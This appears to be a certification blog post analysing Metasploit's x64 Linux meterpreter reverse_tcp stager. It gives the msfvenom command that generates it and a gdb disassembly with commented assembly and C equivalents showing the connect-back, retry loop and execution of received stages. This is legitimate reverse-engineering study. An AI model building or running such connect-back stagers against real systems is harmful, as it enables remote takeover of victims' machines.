Title: SLAE64 - Assignment 5.1
Date: 2022-06-25T08:00:24.000Z

<h2 id="disclaimer">Disclaimer</h2><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p><p><a href="https://www.pentesteracademy.com/course?id=7">https://www.pentesteracademy.com/course?id=7</a></p><p>Student ID: PA-30398</p><h2 id="analysis">Analysis</h2><p>For the fifth assignment, I decided to analyze the following shellcode samples:</p><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>linux/x64/meterpreter/reverse_tcp</td>
<td>Inject the mettle server payload (staged). Connect back to the attacker</td>
</tr>
<tr>
<td>linux/x64/pingback_reverse_tcp</td>
<td>Connect back to attacker and report UUID (Linux x64)</td>
</tr>
<tr>
<td>linux/x64/shell_bind_ipv6_tcp</td>
<td>Listen for an IPv6 connection and spawn a command shell</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><p>This post focuses on the first one, <code>linux/x64/meterpreter/reverse_tcp</code>.</p><p>Let's start from the very beginning i.e., generating the shellcode, which you can do by using the the <em>ruby</em> script <code>msfvenom</code> available by default on Kali Linux distributions.</p><p>Below is the command I ran to generate the shellcode:</p><pre><code class="language-bash">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.170 LPORT=443 -f elf -o shellcode
# [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
# [-] No arch selected, selecting arch: x64 from the payload
# No encoder specified, outputting raw payload
# Payload size: 130 bytes
# Final size of elf file: 250 bytes
# Saved as: shellcode
</code></pre><p>As you may have noticed, I decided to use the format <code>elf</code> instead of <code>raw</code>.</p><p>This is due to the fact that by default shellcode can't be executed on the system, but it needs a specific file structure that the system can understand.</p><p>In this case, since the system is based on a Linux kernel, we can use the ELF format.</p><p>The resulting binary is a 64-bit one, hence it will run on x86-64 systems only:</p><pre><code class="language-bash">file ./shellcode
# ./shellcode: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
</code></pre><p>Next, we can start the real analysis with <code>gdb</code>:</p><pre><code class="language-bash">gdb -q ./shellcode  
# Reading symbols from ./shellcode...
# (No debugging symbols found in ./shellcode)
(gdb) starti
# Starting program: /home/kali/slae64/exam/assignment/5/part/1/shellcode 

# Program stopped.
# 0x0000000000400078 in ?? ()
(gdb) disassemble $rip,+23
# Dump of assembler code from 0x400078 to 0x40008f:
# =&gt; 0x0000000000400078:  xor    rdi,rdi
#    0x000000000040007b:  push   0x9
#    0x000000000040007d:  pop    rax
#    0x000000000040007e:  cdq    
#    0x000000000040007f:  mov    dh,0x10
#    0x0000000000400081:  mov    rsi,rdx
#    0x0000000000400084:  xor    r9,r9
#    0x0000000000400087:  push   0x22
#    0x0000000000400089:  pop    r10
#    0x000000000040008b:  mov    dl,0x7
#    0x000000000040008d:  syscall
</code></pre><p>Judging by the output of the last command, the first instructions seem to be related to the syscall 9 (<code>sys_mmap</code>):</p><pre><code class="language-nasm">; clear the register RDI
xor    rdi,rdi

; store 0x9 in the register RAX
push   0x9
pop    rax

; sing-extend EAX to EDX
; basically, if EAX is positive, it clears EDX (and the whole RDX register)
cdq    

; move the value 0x1000 into DX
; and copy it into RSI
mov    dh,0x10
mov    rsi,rdx

; clear the register R9
xor    r9,r9

; store the value 0x22 into the register R10
push   0x22
pop    r10

; store the value 0x1007 into DX
mov    dl,0x7
syscall
</code></pre><p>These instructions invoke the syscall <strong>sys_mmap</strong> in order to map/unmap files or devices into memory. You can find more information following the link below:</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://man7.org/linux/man-pages/man2/mmap.2.html"><div class="kg-bookmark-content"><div class="kg-bookmark-title">mmap(2) - Linux manual page</div><div class="kg-bookmark-description"></div><div class="kg-bookmark-metadata"><span class="kg-bookmark-author">Linux manual page</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://man7.org/tlpi/cover/TLPI-front-cover-vsmall.png" alt=""></div></a></figure><p>The prototype of the function <code>mmap</code> looks like this:</p><figure class="kg-card kg-code-card"><pre><code class="language-cpp">void *mmap(
    void *addr,
    size_t length,
    int prot,
    int flags,
    int fd,
    off_t offset
);
</code></pre><figcaption>Function Prototype of <code>mmap</code></figcaption></figure><p>The previous instructions can be converted to following C code:</p><pre><code class="language-cpp">mmap(
  NULL,       // let the kernel choose where to allocate the memory space
  0x1000,     // allocate a page of 1000 bytes
  0x1007,     // PROT_EXEC | PROT_READ | PROT_WRITE
  0x22,       // MAP_ANONYMOUS | MAP_PRIVATE
  ?,          // ignored, since we're using MAP_ANONYMOUS
  0           // MAP_ANONYMOUS requires this parameter to be 0
);
</code></pre><p>Overall, the call to <code>mmap</code> simply creates an anonymous mapping of <strong>1000 </strong>bytes and sets the permissions as <em>READ</em>, <em>WRITE</em>, and <em>EXECUTE</em>.</p><p>It's probably going to be used later for storing the shellcode of the second stage.</p><p>After that, we have the following instructions:</p><pre><code class="language-bash">(gdb) disassemble $rip,+3
# Dump of assembler code from 0x40008f to 0x4000a4:
# =&gt; 0x000000000040008f:  test   rax,rax
#    0x0000000000400092:  js     0x4000e5
</code></pre><p>This one looks like a conditional statement.</p><!--kg-card-begin: markdown--><p>First, the value returned by mmap (stored inside the register RAX) is tested in order to determine whether the this value is:</p>
<ul>
<li>signed -&gt; mmap failed and it returned the value -1</li>
<li>unsigned -&gt; mmap succeeded, returning the address of the mapping.</li>
</ul>
<!--kg-card-end: markdown--><p>If the call to mmap <strong>failed</strong>, then the shellcode jumps to the address <code>0x4000e5</code>, which contains the following instructions:</p><pre><code class="language-bash">(gdb) x/5i 0x4000e5
  #  0x4000e5:    push   0x3c
  #  0x4000e7:    pop    rax
  #  0x4000e8:    push   0x1
  #  0x4000ea:    pop    rdi
  #  0x4000eb:    syscall
</code></pre><p>The syscall identified by the hex number <strong>0x3c </strong>is <code>sys_exit</code>.</p><p>In this case the first argument passed to the syscall is the number <strong>0x1</strong>, stored inside the register <code>RDI</code>.</p><p>In conclusion, if the call to <code>sys_mmap</code> fails, then the shellcode calls <code>sys_exit</code>, terminating its execution and returning the exit code 1.</p><p>Back to the successful case, after the previous <strong>jump signed</strong> instruction (<code>js 0x4000e5</code>), we have this:</p><pre><code class="language-bash">(gdb) disassemble $rip,+21
# Dump of assembler code from 0x400094 to 0x4000a9:
# =&gt; 0x0000000000400094:  push   0xa
#    0x0000000000400096:  pop    r9
#    0x0000000000400098:  push   rax
#    0x0000000000400099:  push   0x29
#    0x000000000040009b:  pop    rax
#    0x000000000040009c:  cdq    
#    0x000000000040009d:  push   0x2
#    0x000000000040009f:  pop    rdi
#    0x00000000004000a0:  push   0x1
#    0x00000000004000a2:  pop    rsi
#    0x00000000004000a3:  syscall 
#    0x00000000004000a5:  test   rax,rax
#    0x00000000004000a8:  js     0x4000e5
</code></pre><p>As usual, let's analyze them one by one:</p><pre><code class="language-nasm">; store the value 0xa inside the register R9
push   0xa
pop    r9

; push the value of RAX (pointer to mapping) on the stack
push   rax

; store the value 0x29 inside RAX (syscall sys_socket)
push   0x29
pop    rax

; clear RDX
cdq    

; store the value 0x2 in the register RDI
push   0x2
pop    rdi

; store the value 0x1 in the register RSI
push   0x1
pop    rsi

; invoke sys_socket
syscall 

; if sys_socket fails (returning -1) then jump to 0x4000e5 (sys_exit)
test   rax,rax
js     0x4000e5
</code></pre><p>These instructions can be converted the following C code:</p><pre><code class="language-cpp">RAX = socket(
  2,            // AF_INET
  1,            // SOCK_STREAM
  0,            // IP protocol
);

if (RAX &lt; 0)
{
  exit(1);
}
</code></pre><p>Once the shellcode has created the socket, the next operations should be connecting to the remote server:</p><pre><code class="language-bash">(gdb) disassemble $rip,+24
# Dump of assembler code from 0x4000aa to 0x4000c2:
# =&gt; 0x00000000004000aa:  xchg   rdi,rax
#    0x00000000004000ac:  movabs rcx,0xaa01a8c0bb010002
#    0x00000000004000b6:  push   rcx
#    0x00000000004000b7:  mov    rsi,rsp
#    0x00000000004000ba:  push   0x10
#    0x00000000004000bc:  pop    rdx
#    0x00000000004000bd:  push   0x2a
#    0x00000000004000bf:  pop    rax
#    0x00000000004000c0:  syscall
</code></pre><p>Let's analyze these instructions:</p><pre><code class="language-nasm">; copy the value of RAX (fd returned by sys_socket) into RDI
xchg   rdi,rax

; sockaddr struct containing IP address and
;   TCP port for the connection (192.168.1.170:4444)
; 0xaa -&gt; 170
; 0x01 -&gt; 1
; 0xa8 -&gt; 168
; 0xc0 -&gt; 192
; 0x01bb -&gt; 443
; 0x0002 -&gt; AF_INET
movabs rcx,0xaa01a8c0bb010002

; store the pointer to the sockaddr struct into RSP (stack pointer)
push   rcx
mov    rsi,rsp

; set RDX to the value 0x10
push   0x10
pop    rdx

; set RAX to the calue 0x2a (syscall sys_connect)
push   0x2a
pop    rax

; invoke sys_connect
syscall
</code></pre><p>They can be converted to the following C code:</p><pre><code class="language-cpp">struct sockaddr_in RSI;

myaddr.sin_family = AF_INET;
myaddr.sin_port = htons(443);
inet_aton("192.168.1.170", &amp;myaddr.sin_addr.s_addr);

connect(RDI, (struct sockaddr*)RSI, 16);
</code></pre><p>All it does is create a <strong>sockaddr</strong> structure that stores the IP address and the TCP port, along with address family (<code>AF_INET</code>, i.e. IPv4), and then pass this structure to the function <code>connect</code>.</p><p>The latter connects the file descriptor obtained from the <code>socket</code> syscall to the remote socket <code>192.168.1.170:443</code>.</p><p>After the call to <code>sys_connect</code>, the following instructions are run:</p><pre><code class="language-bash">(gdb) disassemble $rip,+27
# Dump of assembler code from 0x4000c2 to 0x4000da:
# =&gt; 0x00000000004000c2:  pop    rcx
#    0x00000000004000c3:  test   rax,rax
#    0x00000000004000c6:  jns    0x4000ed
#    0x00000000004000c8:  dec    r9
#    0x00000000004000cb:  je     0x4000e5
#    0x00000000004000cd:  push   rdi
#    0x00000000004000ce:  push   0x23
#    0x00000000004000d0:  pop    rax
#    0x00000000004000d1:  push   0x0
#    0x00000000004000d3:  push   0x5
#    0x00000000004000d5:  mov    rdi,rsp
#    0x00000000004000d8:  xor    rsi,rsi
#    0x00000000004000db:  syscall
</code></pre><p>As usual, let's analyze them:</p><pre><code class="language-nasm">; get the bytes of the sockaddr struct and copy them into RCX
pop    rcx

; test the return value of sys_connect
; jump to 0x4000ed if the value isn't negative (failure)
test   rax,rax
jns    0x4000ed

; decrement the value of R9
; if it's equal to 0, then jump to sys_exit(1)
dec    r9
je     0x4000e5

; save the file descriptor of the socket created previously on the stack
push   rdi

; set RAX to 0x23 (sys_nanosleep)
push   0x23
pop    rax

; create a timespec structure (5 seconds and 0 nanoseconds)
push   0x0
push   0x5

; get the address of the timespec structure and store it into RDI
mov    rdi,rsp

; clear RSI
xor    rsi,rsi

; invoke sys_nanosleep
syscall
</code></pre><p>These instructions can be converted to the following C code:</p><pre><code class="language-cpp">if (RAX &gt; 0)
{
  // 0x4000ed
}

if (R9 == 0)
{
  exit(1);
}

struct timespec t;
t.tv_sec = 5;
t.tv_nsec = 0;

nanosleep(&amp;t, NULL);
</code></pre><p>The shellcode sleeps for <strong>5 seconds</strong> if it doesn't succeed to connect to the remote socket.</p><p>After the call to <code>sys_nanosleep</code>, follows these instructions:</p><pre><code class="language-bash">(gdb) disassemble $rip,+14
# Dump of assembler code from 0x4000dd to 0x4000f5:
# =&gt; 0x00000000004000dd:  pop    rcx
#    0x00000000004000de:  pop    rcx
#    0x00000000004000df:  pop    rdi
#    0x00000000004000e0:  test   rax,rax
#    0x00000000004000e3:  jns    0x4000ac
#    0x00000000004000e5:  push   0x3c
#    0x00000000004000e7:  pop    rax
#    0x00000000004000e8:  push   0x1
#    0x00000000004000ea:  pop    rdi
#    0x00000000004000eb:  syscall
</code></pre><p>As you may notice, the shellcode uses the <code>POP</code> instruction 3 times:</p><ul><li>2 times in order to retrieve the value <code>0x0</code> and store it into the register <code>RCX</code></li><li>1 time in order to retrieve the file descriptor of the socket, and store it into the register <code>RDI</code></li></ul><p>After that, the shellcode checks whether the return value of <code>sys_nanosleep</code> is positive, if so jumping back to <code>0x4000ac</code> in order to execute <code>sys_connect</code> once again.</p><p>If the syscall <code>sys_nanosleep</code> returns a signed value (negative one), then the shellcode continues to the address <code>0x4000e5</code> to invoke the syscall <code>sys_exit</code>.</p><p>These operations are performed 9 times, for a total of <strong>45 seconds</strong> in case it can't connect to the <em>meterpreter</em> handler.</p><p>You can test this by using the shell command <code>time</code>:</p><pre><code class="language-bash">time ./shellcode

# real    45.13s
# user    0.00s
# sys     0.00s
# cpu     0%
</code></pre><p>Anyway, let's go back to the address <code>0x4000c6</code>.</p><p>If the call to <code>connect</code> is successful, then the shellcode jumps to the address <code>0x4000ed</code>, which points to these instructions:</p><pre><code class="language-bash">0x00000000004000ed in ?? ()
# (gdb) disassemble $rip,+24
# Dump of assembler code from 0x4000ed to 0x400105:
# =&gt; 0x00000000004000ed:  pop    rsi
#    0x00000000004000ee:  push   0x7e
#    0x00000000004000f0:  pop    rdx
#    0x00000000004000f1:  syscall 
#    0x00000000004000f3:  test   rax,rax
#    0x00000000004000f6:  js     0x4000e5
#    0x00000000004000f8:  jmp    rsi
#    0x00000000004000fa:  add    BYTE PTR [rax],al
#    0x00000000004000fc:  add    BYTE PTR [rax],al
#    0x00000000004000fe:  add    BYTE PTR [rax],al
#    0x0000000000400100:  add    BYTE PTR [rax],al
#    0x0000000000400102:  add    BYTE PTR [rax],al
#    0x0000000000400104:  add    BYTE PTR [rax],al
</code></pre><p>Follows a short analysis:</p><pre><code class="language-nasm">; get the address of the mapping from the stack
pop    rsi

; store the value 126 into RDX
push   0x7e
pop    rdx

; invoke sys_read (syscall no. 0x0)
syscall

; check if call to sys_read was successful, otherwise jump to sys_exit(1)
test   rax,rax
js     0x4000e5

; jump the shellcode received through sys_read
jmp    rsi
</code></pre><p>We now know that the shellcode expects <strong>126 </strong>bytes of data from the meterpreter handler after the initial connection.</p><p>The instructions run after the syscall <code>recvfrom</code> are the following:</p><pre><code class="language-bash">(gdb) x/100i $pc
# =&gt; 0x7ffff7ff8000:      push   rdi
#    0x7ffff7ff8001:      xor    rdi,rdi
#    0x7ffff7ff8004:      mov    rsi,0x2df7c4
#    0x7ffff7ff800b:      mov    rdx,0x7
#    0x7ffff7ff8012:      mov    r10,0x22
#    0x7ffff7ff8019:      xor    r8,r8
#    0x7ffff7ff801c:      xor    r9,r9
#    0x7ffff7ff801f:      mov    rax,0x9
#    0x7ffff7ff8026:      syscall

#    0x7ffff7ff8028:      mov    rdx,rsi
#    0x7ffff7ff802b:      mov    rsi,rax
#    0x7ffff7ff802e:      pop    rdi
#    0x7ffff7ff802f:      mov    r10,0x100
#    0x7ffff7ff8036:      xor    r8,r8
#    0x7ffff7ff8039:      xor    r9,r9
#    0x7ffff7ff803c:      mov    rax,0x2d
#    0x7ffff7ff8043:      syscall

#    0x7ffff7ff8045:      and    rsp,0xfffffffffffffff0
#    0x7ffff7ff8049:      add    sp,0x50
#    0x7ffff7ff804d:      mov    rax,0x6d
#    0x7ffff7ff8054:      push   rax
#    0x7ffff7ff8055:      mov    rcx,rsp
#    0x7ffff7ff8058:      xor    rbx,rbx
#    0x7ffff7ff805b:      push   rbx
#    0x7ffff7ff805c:      push   rbx
#    0x7ffff7ff805d:      push   rsi
#    0x7ffff7ff805e:      mov    rax,0x7
#    0x7ffff7ff8065:      push   rax
#    0x7ffff7ff8066:      push   rbx
#    0x7ffff7ff8067:      push   rbx
#    0x7ffff7ff8068:      push   rdi
#    0x7ffff7ff8069:      push   rcx
#    0x7ffff7ff806a:      mov    rax,0x2
#    0x7ffff7ff8071:      push   rax
#    0x7ffff7ff8072:      mov    rax,0x8d55
#    0x7ffff7ff8079:      add    rsi,rax
#    0x7ffff7ff807c:      jmp    rsi
</code></pre><p>Below is the analysis of the first block.</p><pre><code class="language-nasm">; store the file descriptor of the socket on the stack
push   rdi

; clear RDI
xor    rdi,rdi

; set some registers:
; - RSI = 3012548
; - RDX = 7
; - R10 = 34
mov    rsi,0x2df7c4
mov    rdx,0x7
mov    r10,0x22

; clear R8 and R9
xor    r8,r8
xor    r9,r9

; set RAX to 0x9 (syscall sys_mmap)
mov    rax,0x9

; invoke sys_mmap
syscall
</code></pre><p>It can be converted to the following C code:</p><pre><code class="language-cpp">mmap(
  0,            // let the kernel choose where to allocate the memory space
  3012548,      // allocate 3012548 bytes
  7,            // PROT_EXEC | PROT_READ | PROT_WRITE
  34,           // MAP_ANONYMOUS | MAP_PRIVATE
  0,            // ignored, since we're using MAP_ANONYMOUS
  0             // MAP_ANONYMOUS requires this parameter to be 0
);
</code></pre><p>It seems the second stage allocates <em>some memory</em> in order to make room for the third stage.</p><p>After that we have the second block of instructions:</p><pre><code class="language-nasm">; copy the value 3012548 into RDX
mov    rdx,rsi

; set RSI to the addresss of the new mapping
mov    rsi,rax

; copy the file descriptor of the socket from the stack
; and store it into RDI
pop    rdi

; set R10 to 256
mov    r10,0x100

; clear R8 and R9
xor    r8,r8
xor    r9,r9

; set RAX to 45 (syscall sys_recvfrom)
mov    rax,0x2d

; invoke sys_recvfrom
syscall
</code></pre><p>As done previously, the shellcode uses the syscall <code>recvfrom</code> in order to read the next stage (in this case the third one) from the meterpreter handler.</p><p>The shellcode received from the handler will be stored at the address of the new mapping.</p><p>The third block is a little longer, but let's analyze it anyway:</p><pre><code class="language-nasm">; align the stack and increase the stack pointer by 50 bytes
; i.e. the last 50 bytes of the stack are going to be replaced by the next instructions
and    rsp,0xfffffffffffffff0
add    sp,0x50

; set RAX to 0x6d
mov    rax,0x6d
push   rax

; store the pointer to 0x6d int RCX
mov    rcx,rsp

; clear RBX
xor    rbx,rbx

; push the some values on the stack
push   rbx
push   rbx
push   rsi
mov    rax,0x7
push   rax
push   rbx
push   rbx
push   rdi
push   rcx
mov    rax,0x2
push   rax

; jump to the address of the new mapping, increased by 0x8d55
mov    rax,0x8d55
add    rsi,rax
jmp    rsi
</code></pre><p>This last block of instructions performs some preliminary operations, such as stack alignment, before jumping to the shellcode of the third stage.</p>